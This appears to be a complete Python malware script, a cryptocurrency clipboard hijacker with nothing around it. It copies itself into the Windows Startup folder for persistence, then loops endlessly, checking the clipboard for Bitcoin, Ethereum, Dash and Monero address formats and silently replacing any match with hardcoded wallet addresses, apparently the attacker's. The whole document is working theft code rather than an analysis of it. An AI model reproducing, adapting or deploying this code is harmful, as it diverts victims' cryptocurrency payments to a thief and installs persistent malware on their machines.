import pyperclip
from subprocess import check_call
import re
import os
import shutil
import sys



def auto_run():

    current_location = sys.argv[0]
    application_name = os.path.basename(current_location)
    startup_folder = os.path.join(os.environ['USERPROFILE'],'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    target_location = os.path.join(startup_folder,application_name)

    if not os.path.exists(target_location):

        try:
            shutil.copy(current_location, startup_folder)

        except:
            pass # This could be optimised with other instructions..

def address_swap():

    try:
        clipboard_data = pyperclip.paste()
        if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
            pyperclip.copy('1HzieRU9oWQeiiYABie6PDtAjrZawd7a6d')
            pyperclip.paste()

        if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
            pyperclip.copy('0x658be041b415298a78744813f0c0b6e49345153d')
            pyperclip.paste()
            
        
        if re.search('X[1-9A-HJ-NP-Za-km-z]{33}$', clipboard_data):
            pyperclip.copy('Xste7BvQgLX5Wrq2Kw5fSDQEeMcRcYamnL')
            pyperclip.paste()
        
        if re.search('4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$', clipboard_data):
            pyperclip.copy('85aF94FdNHrFFbgnuKnpQfJSLL7HYQqVJaKfoJ8CgWSeLh7PfaNAFy3NxzQ69xrNWLCJVHjExXxQwc4Du5kaYRH81qcKdPD')
            pyperclip.paste()

    except:
        data = None

def loop_through():
    
    while True:
        address_swap()


auto_run()
loop_through()











